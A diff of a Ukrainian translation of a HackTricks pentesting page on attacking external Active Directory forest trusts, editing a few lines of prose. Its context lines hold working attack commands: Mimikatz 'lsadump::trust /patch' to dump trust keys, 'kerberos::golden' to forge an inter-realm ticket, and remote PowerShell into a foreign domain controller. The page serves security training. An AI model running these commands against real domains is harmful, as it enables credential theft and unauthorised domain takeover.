@@ -1,4 +1,4 @@
-# Зовнішній ліс домену - односторонній (вхідний) або двосторонній
+# Зовнішній лісовий домен - односторонній (вхідний) або двосторонній
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -74,7 +74,7 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 
 ### Увійти
 
-Використовуючи звичайний метод з обліковими даними користувача, який має доступ до зовнішнього домену, ви повинні мати можливість отримати доступ до:
+Використовуючи звичайний метод з обліковими даними користувачів, які мають доступ до зовнішнього домену, ви повинні мати можливість отримати доступ до:
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
@@ -91,7 +91,7 @@ Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\admini
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Ви можете **підписати** з **достовірним** ключем **TGT, що імплементує** користувача поточного домену.
+Ви можете **підписати** **довіреним** ключем **TGT, що імплементує** користувача поточного домену.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
